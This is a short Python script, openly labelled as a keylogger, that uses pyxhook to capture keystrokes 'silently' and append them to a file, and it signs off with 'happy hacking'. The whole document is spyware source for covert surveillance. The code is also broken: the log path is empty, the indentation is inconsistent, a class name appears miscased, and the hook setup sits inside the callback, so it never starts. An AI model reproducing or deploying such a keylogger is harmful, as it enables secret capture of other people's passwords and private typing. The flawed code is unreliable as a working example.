

#simple  python keylogger for capturing the keystrokes silently 
# used simple file handling operation to silently store the keylogging data into the file
import pyxhook 

filelogs = ""
hook_object = pyxhook.Hookmanager() # defined the hook manager object from the class pyxhook
# keystroke logging function define

def Onkeystroke(event):  # function 

	fileo = open(filelogs,'a')
	fileo.write(event.key)
	
    fileo.write('\n')	
	fileo.close()
	
	
	if event.Ascii==96:
		fileo.close()
		hook_object.cancel()
		
	

	hook_object.Keydown = Onkeystroke
	
	hook_object.HookKeyboard()
	hook_object.start()
	
	
	
# program ends
# happy hacking 	
	